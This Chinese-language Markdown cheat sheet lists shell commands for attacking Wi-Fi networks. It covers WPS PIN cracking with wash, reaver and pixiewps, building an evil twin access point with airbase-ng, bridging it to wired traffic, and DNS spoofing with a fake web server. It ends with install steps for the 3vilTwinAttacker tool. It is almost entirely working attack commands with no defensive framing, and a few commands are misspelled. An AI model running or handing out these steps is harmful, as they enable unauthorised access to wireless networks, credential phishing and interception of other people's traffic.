
# wps破解

* airodump-ng

* wifite

* 3vilTwinAttacker

## wps破解
```shell 
    service network-manager stop
    airmon-ng check kill

    1.启动监听模式后，发现支持wps的ap
        wash -C -i wlan0mon
        airodump-ng wlan0mon -b <ap mac> --wps
    2.爆破pin码
        reaver -i wlan0mon -b <ap mac> -vv
    3.秒破pin码
        reaver -i wlan0mon -b <ap mac> -vv -K l
        pixiewps
        reaver -i wlan0mon -b <ap mac> -vv -p 8888888
```


## wifite
```shell 
* EVIL TWIN AP	
    1. airbase-ng -a <AP mac> --essid "kifi" -c 11 wlan0mon
    2. apt-get install bridge-utils
    3. brctl addbr bridge
    4. brctl addif bridge eth0
        dhclient eth0 (获取有线ip)
    5. brctl addif bridge at0
    6. ifconfig eth0 0.0.0.0 up
    7. ifconfig at0 0.0.0.0 up
    8. ifconfig bridge 192.168.1.10 up
    9. route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1
    10. echo 1 > /proc/sys/net/ipv4/ip_forward

    11. dnspoof -i bridge -f dnsspoof.hosts
        /usr/share/dsniff/dnsspoof.hosts
    12. apachet2ctl start
```

## 3vilTwinAttacker
```shell 
    1. git clone https://github.com/P0cl4bs/3vilTwinAttacker.git
    2. cd 3vilTwinAttacker
    3. chmod +x installer.sh
    4. ./installer.sh install
```

